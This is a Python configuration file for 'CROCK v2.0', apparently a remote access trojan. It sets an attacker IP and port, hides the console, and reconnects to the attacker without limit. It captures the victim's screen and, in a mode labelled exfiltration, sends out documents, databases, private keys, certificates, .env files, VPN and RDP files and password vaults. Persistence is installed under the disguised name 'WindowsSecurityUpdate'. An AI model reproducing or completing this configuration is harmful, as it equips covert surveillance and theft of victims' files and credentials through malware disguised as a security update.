# config.py - Configuración centralizada CROCK v2.0
ATTACKER_IP = "192.168.1.13"
ATTACKER_PORT = 4444
ATTACK_MODE = "screen"
HIDE_CONSOLE = True
AUTO_RECONNECT = True
FPS_LIMIT = 15
SCREEN_QUALITY = 50
MONITOR_NUMBER = 0

# Cifrado AES-256
ENCRYPTION_KEY = "crock_default_key_change_me_2024"
USE_ENCRYPTION = True

# Modo FILES - Exfiltración
FILE_EXTENSIONS = [
    ".doc", ".docx", ".pdf", ".xlsx", ".xls", ".pptx", ".ppt",
    ".txt", ".csv", ".rtf",
    ".jpg", ".jpeg", ".png", ".bmp",
    ".zip", ".rar", ".7z",
    ".sql", ".db", ".sqlite", ".mdb",
    ".key", ".pem", ".crt", ".pfx",
    ".env", ".cfg", ".ini", ".conf",
    ".json", ".xml", ".yaml", ".yml",
    ".py", ".ps1", ".bat", ".sh",
    ".rdp", ".ovpn", ".kdbx",
]
TARGET_DIRS = [
    "Desktop", "Documents", "Downloads", "Pictures",
    "OneDrive", "Dropbox",
]
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB por archivo
MAX_TOTAL_SIZE = 500 * 1024 * 1024  # 500MB total

# Persistencia
PERSISTENCE = True
PERSISTENCE_NAME = "WindowsSecurityUpdate"
PERSISTENCE_DIR = "Microsoft\\Windows\\Security"

# Reconexión
RECONNECT_BASE_DELAY = 2
RECONNECT_MAX_DELAY = 60
RECONNECT_MAX_RETRIES = 0  # 0 = ilimitado
